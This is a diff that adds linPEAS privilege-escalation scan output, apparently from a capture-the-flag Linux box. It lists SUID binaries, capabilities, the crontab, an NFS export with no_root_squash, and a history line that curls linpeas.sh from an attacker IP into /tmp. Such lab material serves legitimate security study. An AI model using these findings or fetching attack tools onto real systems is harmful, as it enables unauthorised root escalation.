@@ -1,0 +1,52 @@
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
+Sudo version 1.8.29
+
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwsr-xr-x. 1 root root 32K Aug 2020 /usr/bin/su
+-rwsr-xr-x. 1 root root 73K Aug 2020 /usr/bin/chage
+-rwsr-xr-x. 1 root root 78K Aug 2020 /usr/bin/gpasswd
+-rwsr-xr-x. 1 root root 41K Aug 2020 /usr/bin/newgrp
+-rwsr-xr-x. 1 root root 23K Aug 2020 /usr/bin/pkexec
+-rwsr-xr-x. 1 root root 57K Aug 2020 /usr/bin/crontab
+-rwsr-xr-x. 1 root root 32K Aug 2020 /usr/bin/passwd
+-rwsr-xr-x. 1 root root 1.9M Sep 2020 /usr/sbin/exim-4.94
+
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+
+╔══════════╣ Cron jobs
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
+/usr/bin/crontab
+Incron is not installed
+-rw-r--r--. 1 root root 501 Aug 2020 /etc/crontab
+
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+
+╔══════════╣ NFS exports?
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+/tmp
+/home/paradox
+
+╔══════════╣ Searching passwords in history files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#commands-with-credentials
+/home/paradox/.bash_history: curl 10.6.x.x:8888/linpeas.sh -o /tmp/linpeas.sh
